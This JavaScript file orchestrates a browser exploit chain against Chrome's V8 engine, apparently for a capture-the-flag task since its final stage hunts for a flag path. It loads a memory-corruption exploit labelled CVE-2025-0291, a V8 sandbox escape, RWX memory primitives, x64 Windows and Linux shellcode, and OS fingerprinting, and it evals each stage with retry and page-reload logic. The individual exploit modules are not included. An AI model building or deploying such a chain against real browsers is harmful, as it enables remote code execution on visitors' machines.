// Exploit settings
let loglevel = 2;
let run_in_worker = false;

// Exploit chain
let main = async () => {
    log("[i] Current log level: " + loglevel);
    if (run_in_worker) log("[i] Running scripts in a Web Worker");

    await include("kit/common/convert.js");
    await include("kit/common/dom.js");
    await include("kit/common/stability.js");
    await include("kit/common/v8-utils.js");
    await include("kit/common/versions.js");
    await include("kit/common/wasm-module-builder.js");

    await include("vulns/symbols.js");

    await include("kit/fingerprint/d8.js");
    await include("kit/fingerprint/useragent.js");

    // Initial V8 memory corruption: CVE-2025-0291
    await include("vulns/memcor/CVE-2025-0291.js");

    await include("kit/v8/cage.js");

    // V8 sandbox escape: issue 379140430
    await include("vulns/v8sbx/379140430.js");

    await include("kit/v8/memory.js");

    await include("kit/v8/rwx/egghunt.js");
    await include("kit/v8/rwx/isolate.js");
    await include("kit/v8/rwx/partitionalloc.js");
    await include("kit/v8/rwx/wasmrwx.js");
    await include("kit/v8/rwx.js");

    await include("kit/shellcodes/x64.js");
    await include("kit/shellcodes/x64-win.js");
    await include("kit/shellcodes/x64-linux.js");

    await include("kit/fingerprint/win.js");
    await include("kit/fingerprint/linux.js");

    // Custom payload: find flag path
    await include("vulns/path_finder.js");
}

function log(msg, level=0) {
    if (level <= loglevel) {
        console.log("\t".repeat((level >= 0) ? level : 0) + msg);
    }
}

let include, worker, worker_eval;
var [RETRY, RELOAD, clean] = [0, false, () => {}];
{
    let evaluate = async (script) => {
        await eval?.(script);
    }

    let worker_code = () => {
        [RETRY, RELOAD, clean] = [0, false, () => {}];
        log = (msg, level=0) => postMessage({"type": "log", "msg": msg, "level": level});
        onmessage = async (e) => {
            try {
                [RETRY, RELOAD] = [0, false];
                await eval?.(e.data);
                postMessage({"type": "done"});
            } catch (err) {
                postMessage({"type": "error", "error": err, "retry": RETRY, "reload": RELOAD});
            }
        };
    }
    let worker_code_str = `(${worker_code})();`;

    if (typeof Blob === "undefined") {
        worker = new Worker(worker_code_str, {type: "string"});
    } else {
        let blob = new Blob([worker_code_str], {type: "application/javascript"});
        worker = new Worker(URL.createObjectURL(blob));
    }

    let currentResolve = log;
    let currentReject = log;
    worker.onmessage = (e) => {
        if (e.data.type === "log") log(e.data.msg, e.data.level);
        else if (e.data.type === "done") currentResolve();
        else if (e.data.type === "error") {
            [RETRY, RELOAD] = [e.data.retry, e.data.reload];
            currentReject(e.data.error);
        }
    }
    worker.onerror = (e) => {
        currentReject(e);
    }

    worker_eval = (script) => {
        return new Promise((resolve, reject) => {
            currentResolve = resolve;
            currentReject = reject;
            worker.postMessage(script);
        });
    }

    let run = async (script, trycount=1) => {
        [RETRY, RELOAD] = [0, false];
        script = `/*${Date.now()}*/` + script;

        try {
            if (run_in_worker && typeof worker !== "undefined") await worker_eval(script);
            else await evaluate(script);
        } catch (error) {
            let msg = error.message ? error.message : error;
            msg += (RETRY > 0) ? (` [${trycount}/${RETRY}` + ((trycount >= RETRY && RELOAD) ? " -> reload" : "") + "]") : "";

            if (trycount < RETRY) {
                log(msg, 1);
                await run(script, trycount+1);
            } else {
                if (msg.startsWith("[-] ")) msg = msg.slice(4);
                throw `[!] ${msg}`;
            }
        }
    }

    let code = "";
    include = async (path, run_now=true) => {
        code += `log("[i] Loading ${path}", 0);`
                + await read(path)
                + ((run_now && !code) ? `//# sourceURL=${path}` : "");
        if (run_now) {
            await run(code);
            code = "";
        }
    }
}

let exit = async () => {
    await clean();
    if (typeof worker !== "undefined") {
        await worker_eval("clean()");
        worker.terminate();
    }

    if (RELOAD) {
        log("[i] Reloading the exploit");
        if (typeof(window) !== "undefined") { window.location.reload(); }
    } else {
        log("[i] Exploit chain done, exit cleanly");
        if (typeof(window) !== "undefined") { window.location.replace("https://0.0.0.0:0/"); }
    }
}

main().catch((err) => log(err.message ? err.message : err, -1)).finally(exit);
